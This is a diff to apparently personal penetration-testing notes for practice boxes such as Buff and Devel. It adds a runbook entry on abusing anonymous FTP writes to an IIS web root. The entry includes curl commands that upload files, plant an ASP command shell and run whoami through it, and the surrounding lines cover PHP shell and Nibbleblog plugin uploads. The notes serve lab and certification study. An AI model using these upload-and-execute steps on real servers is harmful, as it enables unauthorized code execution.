@@ -32,6 +32,13 @@ Work through the bypass ladder in order:
 → Request upload/kamehameha.php and confirm code execution with whoami
 → See [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]]
 
+### Anonymous FTP writes to an IIS web root
+→ Upload a harmless file with `curl --upload-file $BoxDir/www/$File ftp://$BoxIP/$RemoteFile`
+→ Request `http://$BoxIP/$RemoteFile` and confirm the returned status and handler
+→ Upload the minimum ASP command shell and query it with `curl -sG --data-urlencode "cmd=whoami" http://$BoxIP/$RemoteFile`
+→ Continue at [[RUNBOOK V2/Windows - Web - FTP Upload]]
+→ See [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]]
+
 ### Nibbleblog 4.0.3 is identified
 → Authenticate once with the documented account test and save the session cookie
 → Upload PHP through the `my_image` plugin using the multipart fields in [[File Upload Attacks#Nibbleblog 4.0.3 Authenticated Plugin Upload|Command Appendix]]
